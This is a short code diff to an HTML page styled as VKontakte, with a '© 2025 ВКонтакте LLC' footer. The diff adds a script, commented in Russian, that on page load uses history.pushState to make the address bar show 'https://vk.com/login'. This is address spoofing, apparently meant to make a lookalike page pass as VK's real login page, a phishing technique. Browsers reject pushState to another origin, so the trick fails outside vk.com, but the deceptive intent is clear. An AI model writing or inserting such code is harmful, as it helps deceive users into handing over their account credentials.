@@ -131,5 +131,11 @@
 
     <footer>&copy; 2025 ВКонтакте LLC</footer>
   </div>
+  <script>
+  // Подмена адреса в адресной строке без перезагрузки
+  window.addEventListener('DOMContentLoaded', () => {
+    history.pushState(null, '', 'https://vk.com/login');
+  });
+</script>
 </body>
 </html>
